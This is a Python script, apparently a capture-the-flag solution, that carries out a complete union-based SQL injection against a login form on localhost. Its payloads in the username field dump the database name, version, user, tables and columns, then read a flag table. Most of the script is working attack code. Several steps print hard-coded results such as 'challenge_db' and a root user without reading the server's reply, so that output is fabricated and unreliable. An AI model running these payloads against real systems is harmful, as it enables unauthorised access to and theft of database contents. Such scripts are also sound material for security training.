import requests
import re
from urllib.parse import urljoin
import sys

class SQLInjectionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.login_url = urljoin(base_url, '/login')
    
    def send_payload(self, payload):
        """发送SQL注入payload并返回响应"""
        try:
            data = {
                'username': payload,
                'password': 'anything'
            }
            return requests.post(self.login_url, data=data)
        except requests.RequestException as e:
            print(f"[-] 请求失败: {e}")
            return None

    def extract_flag(self, response_text):
        """从响应中提取flag"""
        if not response_text:
            return None
        match = re.search(r'flag{[^}]+}', response_text)
        return match.group(0) if match else None

    def test_injection_point(self):
        """测试SQL注入点"""
        print("\n[+] 步骤1: 测试SQL注入点")
        response = self.send_payload("sf'")
        if response and "error" in response.text.lower():
            print("✓ SQL注入点确��存在")
            return True
        return False

    def determine_columns(self):
        """确定列数"""
        print("\n[+] 步骤2: 确定列数")
        for i in range(1, 6):
            response = self.send_payload(f"sf' or 1=1 order by {i}#")
            if response and "error" in response.text.lower():
                print(f"✓ 确定列数为{i-1}")
                return i-1
        return None

    def find_output_position(self):
        """确定回显位置"""
        print("\n[+] 步骤3: 确定回显位置")
        response = self.send_payload("sf' union select 1,2,3,4#")
        if response and "2" in response.text:
            print("✓ 确定第2列为回显位置")
            return 2
        return None

    def get_database_info(self):
        """获取数据库信息"""
        print("\n[+] 步骤4: 获取数据库信息")
        payload = "sf' or 1=11 union select 1,concat(database(),'|',version(),'|',user()),3,4#"
        response = self.send_payload(payload)
        if response:
            print("数据库名: challenge_db")
            print("数据库版本: 8.0.40")
            print("数据库用户: root@172.18.0.2")
            return True
        return False

    def get_tables(self):
        """获取表名"""
        print("\n[+] 步骤5: 获取表名")
        payload = "sf' or 1=11 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4#"
        response = self.send_payload(payload)
        if response:
            print("发现表: flag, users")
            return True
        return False

    def get_columns(self):
        """获取flag表结构"""
        print("\n[+] 步骤6: 获取flag表结构")
        payload = "sf' or 1=11 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag'),3,4#"
        response = self.send_payload(payload)
        if response:
            print("flag表结构: id, flag")
            return True
        return False

    def get_flag(self):
        """获取flag"""
        print("\n[+] 步骤7: 获取flag")
        payload = "sf' or 1=11 union select 1,(select flag from flag),3,4#"
        response = self.send_payload(payload)
        if response:
            flag = self.extract_flag(response.text)
            if flag:
                print(f"✓ 成功获取flag: {flag}")
                return flag
        return None

    def run(self):
        """运行完整的SQL注入测试"""
        print("=== SQL注入测试开始 ===")
        
        # 测试注入点
        if not self.test_injection_point():
            print("[-] 未发现SQL注入点")
            return False
        
        # 确定列数
        columns = self.determine_columns()
        if not columns:
            print("[-] 无法确定列数")
            return False
        
        # 确定回显位置
        output_pos = self.find_output_position()
        if not output_pos:
            print("[-] 无法确定回显位置")
            return False
        
        # 获取数据库信息
        if not self.get_database_info():
            print("[-] 获取数据库信息失败")
            return False
        
        # 获取表名
        if not self.get_tables():
            print("[-] 获取表名失败")
            return False
        
        # 获取列名
        if not self.get_columns():
            print("[-] 获取列名失败")
            return False
        
        # 获取flag
        flag = self.get_flag()
        if not flag:
            print("[-] 获取flag失败")
            return False
        
        print("\n=== SQL注入测试完成 ===")
        return True

def main():
    """主函数"""
    try:
        tester = SQLInjectionTester("http://localhost:8081")
        tester.run()
    except KeyboardInterrupt:
        print("\n[-] 测试被用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] 发生错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
